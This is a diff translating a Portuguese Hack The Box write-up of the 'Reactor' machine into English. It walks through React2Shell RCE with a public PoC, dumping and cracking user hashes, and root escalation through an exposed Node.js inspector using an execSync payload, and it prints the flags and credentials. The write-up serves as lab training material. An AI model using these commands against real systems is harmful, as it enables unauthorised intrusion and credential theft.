@@ -1,15 +1,15 @@
 # Reactor — Hack The Box
 
-**Dificuldade:** —
+**Difficulty:** —
 **OS:** Linux
-**Data:** 2026-08-15
+**Date:** 2026-08-15
 **IP:** `10.129.105.11`
 
-## Resumo
+## Summary
 
-A máquina expõe uma aplicação Next.js ("ReactorWatch") na porta 3000, vulnerável a **CVE-2025-55182 / CVE-2025-66478 ("React2Shell")**, um RCE não autenticado no protocolo Flight das React Server Components. A partir do acesso inicial (`node`), uma base de dados SQLite exposta revelou hashes de utilizadores; o hash do utilizador `engineer` foi crackado via rockyou. Escalação para root através do debugger do Node.js (`--inspect`) exposto em `127.0.0.1:9229`, associado a um processo de monitorização que corria com privilégios root.
+The machine exposes a Next.js application ("ReactorWatch") on port 3000, vulnerable to **CVE-2025-55182 / CVE-2025-66478 ("React2Shell")**, an unauthenticated RCE in the React Server Components Flight protocol. From initial access as `node`, an exposed SQLite database revealed user password hashes; the `engineer` user's hash was cracked via rockyou. Privilege escalation to root was achieved through the Node.js debugger (`--inspect`) exposed on `127.0.0.1:9229`, tied to a monitoring process running with root privileges.
 
-## Reconhecimento
+## Reconnaissance
 
 ```bash
 nmap -sC -sV 10.129.105.11
@@ -21,19 +21,19 @@ PORT     STATE SERVICE VERSION
 3000/tcp open  http    Next.js (React 19.0.0)
 ```
 
-## Enumeração
+## Enumeration
 
-- Porta 3000: dashboard estático "ReactorWatch | Core Monitoring System" — sem interação visível.
-- Análise dos bundles JS (`/_next/static/chunks/*.js`) confirmou **React 19.0.0** e uso de React Server Components / Server Actions (headers `Next-Action`, `RSC`, `Next-Router-State-Tree`).
-- `gobuster` e testes manuais de rotas comuns (`/admin`, `/api`, `/login`, etc.) não revelaram endpoints adicionais — a app é maioritariamente estática do lado do cliente.
-- Manifests do Next.js (`app-build-manifest.json`, `build-manifest.json`) devolveram 404 — sem rotas escondidas visíveis.
-- A combinação de versão exata (React 19.0.0) + uso confirmado de RSC/Flight apontou para uma classe de vulnerabilidade conhecida.
+- Port 3000: static "ReactorWatch | Core Monitoring System" dashboard — no visible interaction.
+- Analysis of the JS bundles (`/_next/static/chunks/*.js`) confirmed **React 19.0.0** and the use of React Server Components / Server Actions (headers `Next-Action`, `RSC`, `Next-Router-State-Tree`).
+- `gobuster` and manual tests of common routes (`/admin`, `/api`, `/login`, etc.) revealed no additional endpoints — the app is largely client-side static.
+- Next.js manifests (`app-build-manifest.json`, `build-manifest.json`) returned 404 — no visible hidden routes.
+- The combination of the exact version (React 19.0.0) and confirmed use of RSC/Flight pointed to a known vulnerability class.
 
-## Acesso Inicial
+## Initial Access
 
-**CVE-2025-55182 (React) / CVE-2025-66478 (Next.js) — "React2Shell"**: falha de deserialização insegura no protocolo Flight das React Server Components, permitindo RCE não autenticado através de um payload HTTP especialmente construído, mesmo em configurações padrão.
+**CVE-2025-55182 (React) / CVE-2025-66478 (Next.js) — "React2Shell"**: an insecure deserialization flaw in the React Server Components Flight protocol, enabling unauthenticated RCE via a specially crafted HTTP payload, even in default configurations.
 
-Confirmação via PoC público (`exploit.py`, variante com flags `-u`/`-c`/`--linux`):
+Confirmed via a public PoC (`exploit.py`, variant with `-u`/`-c`/`--linux` flags):
 
 ```bash
 python exploit.py -u http://10.129.105.11:3000 -c "whoami" --linux
@@ -44,72 +44,72 @@ OUTPUT:
 node
 ```
 
-Confirmado RCE como o utilizador `node` (uid=999, gid=988).
+RCE confirmed as user `node` (uid=999, gid=988).
 
-## Pós-Exploração / Movimento Lateral
+## Post-Exploitation / Lateral Movement
 
-Enumeração do diretório da aplicação (`/opt/reactor-app`) revelou um ficheiro `reactor.db` (SQLite):
+Enumeration of the application directory (`/opt/reactor-app`) revealed a `reactor.db` file (SQLite):
 
 ```bash
 python exploit.py -u http://10.129.105.11:3000 -c "sqlite3 reactor.db .dump" --linux
 ```
 
-Extraiu-se a tabela `users`:
+Extracted the `users` table:
 
 ```sql
 INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
 INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb');
 ```
 
-Crack dos hashes MD5 com hashcat:
+Cracked the MD5 hashes with hashcat:
 
 ```bash
 hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-Resultado: `engineer:reactor1`
+Result: `engineer:reactor1`
 
-Login SSH bem-sucedido:
+Successful SSH login:
 
 ```bash
 ssh engineer@10.129.105.11
 ```
 
-## Escalação de Privilégios
+## Privilege Escalation
 
-Enumeração de processos revelou um serviço a correr como root com o debugger do Node.js ativo e exposto em localhost:
+Process enumeration revealed a root-owned service running with the Node.js debugger active and exposed locally:
 
 ```
 root  1125  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
 ```
 
-O inspector do Node permite execução de código arbitrário no contexto do processo (root):
+The Node inspector allows arbitrary code execution in the process context (root):
 
 ```bash
 node inspect 127.0.0.1:9229
 ```
 
-Dentro da REPL do debugger:
+Inside the debugger REPL:
 
 ```javascript
 repl
 process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()
 ```
 
-Execução bem-sucedida como root, confirmando a escalação completa.
+Successful execution as root, confirming full privilege escalation.
 
 ## Flags
 
 - User: `c0d1e6c23e28b9ffe9f43be0379939ad`
 - Root: `cf7fe87eb3e229f42ef20bc3feeb3002`
 
-## Lições Aprendidas
+## Lessons Learned
 
-- Versões exatas de frameworks (aqui, React 19.0.0) são um indicador direto de CVEs conhecidas — vale sempre a pena confirmar a versão via bundles JS/headers antes de gastar tempo em enumeração de rotas.
-- Grupos de sistema como `lxd` são pistas óbvias de escalação, mas nem sempre estão disponíveis (LXD não instalado neste caso) — vale a pena sempre também revisar processos a correr como root (`ps aux`) à procura de portas de debug ou serviços mal configurados.
-- O Node.js Inspector (`--inspect`), quando exposto mesmo só em localhost, é uma superfície de ataque crítica quando combinado com acesso local — permite RCE trivial no contexto do processo.
+- Exact framework versions (here, React 19.0.0) are a direct indicator of known CVEs — always worth confirming the version via JS bundles/headers before spending time on route enumeration.
+- System groups like `lxd` are an obvious escalation clue, but aren't always available (LXD wasn't installed here) — always worth reviewing root-owned processes (`ps aux`) for exposed debug ports or misconfigured services too.
+- The Node.js Inspector (`--inspect`), even when only exposed on localhost, is a critical attack surface once combined with local access — it enables trivial RCE in the process's context.
 
-## Referências
+## References
 
 - [NVD — CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
 - [Wiz Research — React2Shell](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
